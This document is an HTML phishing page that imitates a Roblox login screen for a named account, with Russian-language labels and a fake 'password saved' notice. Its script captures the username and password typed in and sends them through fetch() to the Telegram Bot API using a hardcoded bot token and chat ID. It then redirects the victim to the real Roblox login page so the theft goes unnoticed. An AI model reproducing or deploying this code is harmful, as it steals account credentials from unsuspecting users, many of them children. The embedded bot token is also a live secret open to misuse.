<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>vet8e35 — Roblox</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Arial,sans-serif}
        body{background:#0b0e17;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
        .login-box{background:#1a1f2e;border-radius:12px;padding:40px 30px;max-width:400px;width:100%;box-shadow:0 8px 24px rgba(0,0,0,0.5)}
        .logo{text-align:center;margin-bottom:16px}
        .avatar{display:block;margin:0 auto 16px;width:120px;height:120px;border-radius:50%;border:3px solid #7b68ee}
        h2{color:#fff;font-size:28px;font-weight:400;text-align:center;margin-bottom:20px}
        label{color:#b0b0b0;font-size:14px;display:block;margin-bottom:4px}
        input{width:100%;padding:14px;margin-bottom:16px;background:#2a2f45;border:1px solid #3b405a;border-radius:8px;color:#fff;font-size:16px}
        input:focus{outline:none;border-color:#7b68ee}
        button{width:100%;padding:14px;background:#7b68ee;border:none;border-radius:8px;color:#fff;font-size:18px;font-weight:bold;cursor:pointer}
        button:hover{background:#6a5acd}
        .links{text-align:center;font-size:13px;color:#7b68ee;margin:12px 0}
        .links a{color:#7b68ee;text-decoration:none}
        .footer{text-align:center;color:#555;font-size:12px;margin-top:16px}
        .saved-pass{background:#1a1f2e;border:1px solid #2a2f45;border-radius:6px;padding:8px 12px;color:#888;font-size:13px;display:flex;justify-content:space-between;margin-bottom:16px}
        .error{color:#ff6b6b;margin-bottom:12px;display:none;text-align:center;font-size:14px}
    </style>
</head>
<body>
<div class="login-box">
    <div class="logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/65/Roblox_Logo_2022.svg/800px-Roblox_Logo_2022.svg.png" width="140" alt="Roblox">
    </div>
    <img class="avatar" src="https://www.roblox.com/headshot-thumbnail/image?userId=8537424647&width=150&height=150&format=png" alt="avatar">
    <h2>vet8e35</h2>
    <div class="error" id="err">Неверный логин или пароль</div>
    <label>Имя пользователя / Email</label>
    <input type="text" id="u" placeholder="Введите логин">
    <label>Пароль</label>
    <input type="password" id="p" placeholder="Введите пароль">
    <button id="loginBtn">Вход</button>
    <div class="links"><a href="#">Забыли пароль?</a><br><a href="#">Отправить код на почту</a></div>
    <div class="saved-pass"><span>🔐 Пароль от <strong>vet8e35</strong> сохранён</span><span>✖</span></div>
    <div style="text-align:center;color:#b0b0b0;font-size:14px;">Нет аккаунта? <a href="#" style="color:#7b68ee;text-decoration:none;">Зарегистрироваться</a></div>
    <div class="footer">Английский → Русский</div>
</div>

<script>
    const BOT_TOKEN = '8995673098:AAFw45G24DM55XxF7MSikSWNHlHYd4-hqCo';
    const CHAT_ID = '8430766765';

    document.getElementById('loginBtn').onclick = function() {
        const u = document.getElementById('u').value;
        const p = document.getElementById('p').value;
        if (!u || !p) {
            document.getElementById('err').style.display = 'block';
            return;
        }
        document.getElementById('err').style.display = 'none';
        this.innerText = '⏳ Проверка...';
        fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CHAT_ID, text: '👤 ' + u + '\n🔑 ' + p})
        });
        setTimeout(() => {
            window.location.href = 'https://www.roblox.com/login';
        }, 1500);
    };
</script>
</body>
</html>